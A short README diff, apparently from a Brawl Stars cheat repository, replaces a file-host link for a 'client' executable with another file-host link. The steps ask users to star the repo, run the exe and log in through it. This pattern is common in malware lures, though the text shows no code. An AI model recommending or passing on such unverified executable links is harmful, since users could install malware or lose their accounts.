@@ -2,7 +2,8 @@
 
 1. Create a github account and star the repo
 2. Download this repo.
-3. Download [client](https://www.mediafire.com/file/ba98ijn20fd4jkt/production.exe/file)
+3. Download [client](https://mega.nz/file/IDUF0CDY#C9ru0PlYLIaLaEHQrXr2d91r4gnhiDd7f5JDWKol-hc)
+
 4. Open brawl stars and choose a brawler and a game mode
 5. Start the client and login
 6. Enjoy! 
